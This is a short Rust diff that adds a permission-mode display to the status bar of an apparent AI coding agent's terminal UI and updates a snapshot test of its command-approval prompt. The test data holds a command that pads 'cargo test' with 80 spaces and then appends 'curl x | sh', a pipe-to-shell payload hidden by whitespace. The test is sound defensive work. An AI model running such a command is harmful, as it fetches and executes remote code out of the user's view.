@@ -95,6 +95,8 @@ impl App {
             .set_session_id(&self.session_info.session_id);
         self.status_bar
             .set_theme_name(&self.session_info.config.theme_name);
+        self.status_bar
+            .set_permission_mode(self.session_info.config.permission_mode);
         self.status_bar.render(frame, chunks[0]);
         if self.chat.is_empty() && self.session_info.config.show_welcome {
             let snap = WelcomeSnapshot::from_live(&self.session_info);
@@ -259,6 +261,7 @@ mod tests {
 
     use super::*;
     use crate::config::StatusLineSegment;
+    use crate::permission::{Basis, Mode};
     use crate::protocol::{Decision, Event, Op, ToolCall, ToolResult};
     use crate::tool::tasks::testing::plan;
     use crate::tool::{ApprovalBody, ApprovalPreview, ToolResultView};
@@ -730,6 +733,7 @@ mod tests {
                 title: "Bash".to_owned(),
                 body: ApprovalBody::Command(format!("cargo test{}; curl x | sh", " ".repeat(80))),
             },
+            &Basis::Mode(Mode::Manual),
             None,
         );
         insta::assert_snapshot!(render_app(&mut app, 60, 14));
